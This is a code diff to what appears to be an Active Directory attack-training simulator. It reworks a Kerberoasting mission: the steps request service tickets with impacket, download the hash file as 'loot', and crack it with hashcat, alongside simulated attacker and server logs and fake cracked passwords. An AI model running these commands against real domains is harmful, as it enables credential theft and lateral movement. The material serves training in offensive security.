@@ -29,12 +29,12 @@ export const kerberoastScenario = {
 
 **Attack Flow:**
 1. Enumerate Service Principal Names (SPNs) in the domain
-2. Request service tickets for accounts with SPNs
-3. Extract the TGS (Ticket Granting Service) tickets
-4. Crack the tickets offline using a password dictionary
+2. Request service tickets and extract them into a crackable hash file.
+3. **Download the captured hash file from the remote machine.**
+4. Crack the hashes offline using a password dictionary.
 
 **Why This Matters:**
-Service accounts often have weak passwords and high privileges. Kerberoasting can quickly identify and compromise these accounts, leading to lateral movement and privilege escalation.
+Service accounts often have weak passwords and high privileges. Kerberoasting can quickly identify and compromise these accounts.
     
 **Note:** This scenario uses the 'svc_backup' credentials compromised in the AS-REP Roasting mission.`,
 
@@ -48,29 +48,29 @@ Service accounts often have weak passwords and high privileges. Kerberoasting ca
       },
       {
         number: 2,
-        title: 'Request Service Tickets',
-        description: 'Using the "svc_backup" credentials, request Kerberos service tickets (TGS) for each SPN found.',
-        command: 'impacket-getTGSs -request contoso.local/svc_backup:[PASSWORD-FROM-FILES-TAB] -spn MSSQLSvc/SQL01.contoso.local',
-        tip: 'The TGS ticket is encrypted with the service account\'s password hash, making it crackable offline'
+        title: 'Request & Extract Service Tickets',
+        description: 'Using the "svc_backup" credentials, request Kerberos service tickets (TGS) and save them to a file.',
+        command: 'impacket-getTGSs -request contoso.local/svc_backup:[PASSWORD-FROM-FILES-TAB] -spn MSSQLSvc/SQL01.contoso.local -outputfile kerberoast_hashes.txt',
+        tip: 'The -outputfile flag saves the hashes in a format hashcat can use.'
       },
       {
         number: 3,
-        title: 'Extract Ticket Hashes',
-        description: 'Convert the TGS tickets to a format that can be cracked with Hashcat or John the Ripper.',
-        command: 'tgsrepcrack.py wordlist.txt ticket.kirbi',
-        tip: 'Extracted hashes are in Kerberos 5 TGS-REP format, compatible with offline crackers'
+        title: 'Download Loot',
+        description: 'The hashes were saved to "kerberoast_hashes.txt" on the machine. Use "ls" to confirm and "download" to retrieve it.',
+        command: 'download kerberoast_hashes.txt',
+        tip: 'This will add the hash file to your "Files" tab.'
       },
       {
         number: 4,
         title: 'Crack Passwords',
-        description: 'Use a password dictionary to crack the extracted hashes and recover service account credentials.',
-        command: 'hashcat -m 13100 tickets.txt wordlist.txt --force',
-        tip: 'Common service account passwords are often weak and can be cracked in minutes'
+        description: 'Now that you have the file, use hashcat (mode 13100) to crack the hashes and recover service account credentials.',
+        command: 'hashcat -m 13100 kerberoast_hashes.txt wordlist.txt --force',
+        tip: 'The cracked password for "sqlservice" will be added to your Files tab.'
       },
       {
         number: 5,
         title: 'Verify Compromised Accounts',
-        description: 'Confirm the cracked credentials work and identify the compromised service accounts.',
+        description: 'The credentials for "sqlservice" are now in your "Files" tab, ready for the next mission.',
         command: null,
         tip: 'Compromised service accounts can now be used for lateral movement and privilege escalation'
       }
@@ -89,60 +89,81 @@ Service accounts often have weak passwords and high privileges. Kerberoasting ca
         '[+] Found 12 accounts with SPNs:',
         '[+]   - MSSQLSvc/SQL01.contoso.local (sqlservice)',
         '[+]   - HTTP/webserver01.contoso.local (iis_app)',
-        // ... (rest of output)
+        '[+]   - LDAP/DC01.contoso.local (krbtgt)',
+        //...
         '[+] Enumeration complete'
       ],
       serverOutput: [
         '[LDAP] LDAP query from 10.0.0.5:49152',
         '[LDAP] Query: (servicePrincipalName=*)',
-        '[LDAP] Returned 12 SPN objects',
-        '[AUDIT] SPN enumeration detected from 10.0.0.5',
-        '[WARN] Potential Kerberoasting reconnaissance activity'
+        '[AUDIT] SPN enumeration detected from 10.0.0.5'
       ],
       delay: 500
     },
     {
       id: 2,
-      expectedCommand: 'impacket-getTGSs -request contoso.local/svc_backup:[LOOT:svc_backup] -spn MSSQLSvc/SQL01.contoso.local',
+      expectedCommand: 'impacket-getTGSs -request contoso.local/svc_backup:[LOOT:svc_backup] -spn MSSQLSvc/SQL01.contoso.local -outputfile kerberoast_hashes.txt',
       attackerOutput: [
         '[*] Requesting TGS for MSSQLSvc/SQL01.contoso.local...',
         '[*] Using credentials: svc_backup@contoso.local',
         '[*] Connecting to KDC...',
         '[+] TGS request successful',
         '[+] Received TGS ticket for sqlservice',
-        '[+] Ticket saved to: ticket_sqlservice.kirbi',
-        // ... (rest of output)
-        '[+] Total tickets extracted: 3'
+        '[*] Requesting TGS for HTTP/webserver01.contoso.local...',
+        '[+] TGS request successful',
+        '[+] Received TGS ticket for iis_app',
+        '[*] Saving hashes to kerberoast_hashes.txt',
+        '[+] Hashes saved!'
       ],
       serverOutput: [
         '[KERBEROS] TGS-REQ from 10.0.0.5',
         '[KERBEROS] SPN: MSSQLSvc/SQL01.contoso.local',
-        // ... (rest of output)
+        '[KERBEROS] Issuing TGS ticket',
+        '[KERBEROS] TGS-REQ from 10.0.0.5',
+        '[KERBEROS] SPN: HTTP/webserver01.contoso.local',
+        '[KERBEROS] Issuing TGS ticket',
         '[ALERT] Multiple TGS requests from single source (10.0.0.5)'
       ],
-      delay: 400
+      delay: 400,
+      // --- NEW: This step now places the file in the simulated system ---
+      lootToGrant: {
+        files: {
+          'kerberoast_hashes.txt': {
+            content: '$krb5tgs$23$*sqlservice$contoso.local...[snip]...\n$krb5tgs$23$*iis_app$contoso.local...[snip]...',
+            size: '8 KB'
+          }
+        }
+      }
     },
     {
       id: 3,
-      expectedCommand: 'tgsrepcrack.py wordlist.txt ticket.kirbi',
+      expectedCommand: 'download kerberoast_hashes.txt',
       attackerOutput: [
-        '[*] Converting TGS tickets to crackable format...',
-        // ... (rest of output)
-        '[+] Hashes saved to: kerberoast_hashes.txt'
+        '[*] Downloading "kerberoast_hashes.txt"...',
+        '[+] File "kerberoast_hashes.txt" (8 KB) downloaded successfully.',
+        '[+] File added to your "Files" tab.'
       ],
       serverOutput: [
-        '[KERBEROS] Ticket conversion detected',
-        '[SYSTEM] No direct impact (tickets already issued)',
-        '[AUDIT] Attacker processing Kerberos tickets offline'
+        '[NET] File transfer detected from 10.0.0.5 (kerberoast_hashes.txt)',
+        '[AUDIT] Potential exfiltration of data.'
       ],
-      delay: 600
+      delay: 400,
+      // --- NEW: This step moves the file to the "Files" tab ---
+      lootToGrant: {
+        download: [{ id: 'kb', name: 'kerberoast_hashes.txt', size: '8 KB' }]
+      }
     },
     {
       id: 4,
-      expectedCommand: 'hashcat -m 13100 tickets.txt wordlist.txt --force',
+      expectedCommand: 'hashcat -m 13100 kerberoast_hashes.txt wordlist.txt --force',
       attackerOutput: [
         '[*] Starting Hashcat TGS-REP cracking...',
-        // ... (rest of output)
+        '[*] Mode: Kerberos 5 TGS-REP etype 23 (13100)',
+        '[*] Wordlist: wordlist.txt (500,000 entries)',
+        '[*] Cracking in progress...',
+        '[*] 25% complete - 125,000 hashes/sec',
+        '[*] 50% complete - 128,000 hashes/sec',
+        '[*] 75% complete - 127,500 hashes/sec',
         '[+] Hash cracked!',
         '[+] sqlservice : P@ssw0rd123!',
         '[+] Hash cracked!',
@@ -154,7 +175,14 @@ Service accounts often have weak passwords and high privileges. Kerberoasting ca
         '[AUDIT] Attacker has extracted service account credentials',
         '[ALERT] Service accounts compromised: sqlservice, iis_app'
       ],
-      delay: 500
+      delay: 500,
+      // --- NEW: This step adds the cracked passwords to the "Files" tab ---
+      lootToGrant: {
+        creds: [
+          { type: 'Password', username: 'sqlservice', secret: 'P@ssw0rd123!' },
+          { type: 'Password', username: 'iis_app', secret: 'ServicePass2024' }
+        ]
+      }
     },
     {
       id: 5,
@@ -165,7 +193,7 @@ Service accounts often have weak passwords and high privileges. Kerberoasting ca
         '[+] Kerberoasting Attack Summary',
         '[+] ============================================',
         '[+] SPNs Enumerated: 12',
-        '[+] Tickets Extracted: 3',
+        '[+] Hashes Extracted: 2',
         '[+] Passwords Cracked: 2',
         '[+] Compromised Accounts:',
         '[+]   - sqlservice (P@ssw0rd123!)',
@@ -173,8 +201,7 @@ Service accounts often have weak passwords and high privileges. Kerberoasting ca
         '[+] ============================================',
         '[*] Next Steps:',
         '[*] 1. Use compromised credentials for lateral movement',
-        '[*] 2. Access SQL Server or IIS with service account',
-        '[*] 3. Escalate privileges to Domain Admin',
+        '[*] 2. Run BloodHound with the new "sqlservice" credentials',
         '',
         '[+] Attack successful! 🎯'
       ],
